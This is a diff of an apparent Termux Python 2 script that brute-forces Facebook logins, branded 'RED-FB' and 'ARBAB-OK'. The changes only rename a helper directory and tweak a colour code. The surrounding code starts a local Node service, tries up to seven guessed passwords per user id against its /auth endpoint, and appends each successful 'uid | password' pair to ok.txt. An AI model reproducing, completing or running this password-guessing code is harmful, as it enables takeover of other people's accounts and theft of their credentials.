@@ -22,17 +22,17 @@ if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
     os.system("apt update && apt install nodejs -y")
 from requests.exceptions import ConnectionError
 os.system("git pull")
-if not os.path.isfile("/data/data/com.termux/files/home/PROHACK/...../node_modules/bytes/index.js"):
+if not os.path.isfile("/data/data/com.termux/files/home/RED-FB/MEMON/node_modules/bytes/index.js"):
     os.system("fuser -k 5000/tcp &")
     os.system("#")
-    os.system("cd ..... && npm install")
-    os.system("cd ..... && node index.js &")
+    os.system("cd MEMON && npm install")
+    os.system("cd MEMON && node index.js &")
     os.system("clear")
     time.sleep(10)
-elif os.path.isfile("/data/data/com.termux/files/home/PROHACK/...../node_modules/bytes/index.js"):
+elif os.path.isfile("/data/data/com.termux/files/home/RED-FB/MEMON/node_modules/bytes/index.js"):
     os.system("fuser -k 5000/tcp &")
     os.system("#")
-    os.system("cd ..... && node index.js &")
+    os.system("cd MEMON && node index.js &")
     os.system("clear")
 bd=random.randint(2e7, 3e7)
 sim=random.randint(2e4, 4e4)
@@ -751,7 +751,7 @@ def l_menu_select():
 			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
 			q = json.loads(data)
 			if "loc" in q:
-				print '\x1b[1;91mARBAB-OK💉\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass1
+				print '\x1b[1;91mARBAB-OK💉\x1b[1;97m-\x1b[1;94m✙\x1b[1;98m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass1
 				ok = open("ok.txt","a")
 				ok.write(uid+" | "+pass1+"\n")
 				ok.close()
@@ -768,7 +768,7 @@ def l_menu_select():
 					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
 					q = json.loads(data)
 					if "loc" in q:
-						print '\x1b[1;91mARBAB-OK💉\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2
+						print '\x1b[1;91mARBAB-OK💉\x1b[1;97m-\x1b[1;94m✙\x1b[1;98m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2
 						ok = open("ok.txt","a")
 						ok.write(uid+" | "+pass2+"\n")
 						ok.close()
@@ -785,7 +785,7 @@ def l_menu_select():
 							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
 							q = json.loads(data)
 							if "loc" in q:
-								print '\x1b[1;91mARBAB-OK💉\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
+								print '\x1b[1;91mARBAB-OK💉\x1b[1;97m-\x1b[1;94m✙\x1b[1;98m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
 								ok = open("ok.txt","a")
 								ok.write(uid+" | "+pass3+"\n")
 								ok.close()
@@ -802,7 +802,7 @@ def l_menu_select():
 									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
 									q = json.loads(data)
 									if "loc" in q:
-										print '\x1b[1;91mARBAB-OK💉\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
+										print '\x1b[1;91mARBAB-OK💉\x1b[1;97m-\x1b[1;94m✙\x1b[1;98m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
 										ok = open("ok.txt","a")
 										ok.write(uid+" | "+pass4+"\n")
 										ok.close()
@@ -819,7 +819,7 @@ def l_menu_select():
 											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
 											q = json.loads(data)
 											if "loc" in q:
-												print '\x1b[1;91mARBAB-OK💉\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass5
+												print '\x1b[1;91mARBAB-OK💉\x1b[1;97m-\x1b[1;94m✙\x1b[1;98m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass5
 												ok = open("ok.txt","a")
 												ok.write(uid+" | "+pass5+"\n")
 												ok.close()
@@ -836,7 +836,7 @@ def l_menu_select():
 													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text
 													q = json.loads(data)
 													if "loc" in q:
-														print '\x1b[1;91mARBAB-OK💉\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass6
+														print '\x1b[1;91mARBAB-OK💉\x1b[1;97m-\x1b[1;94m✙\x1b[1;98m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass6
 														ok = open("ok.txt","a")
 														ok.write(uid+" | "+pass6+"\n")
 														ok.close()
@@ -853,7 +853,7 @@ def l_menu_select():
 															data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass7, headers=header).text
 															q = json.loads(data)
 															if "loc" in q:
-																print '\x1b[1;91mARBAB-OK💉\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass7
+																print '\x1b[1;91mARBAB-OK💉\x1b[1;97m-\x1b[1;94m✙\x1b[1;98m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass7
 																ok = open("ok.txt","a")
 																ok.write(uid+" | "+pass7+"\n")
 																ok.close()
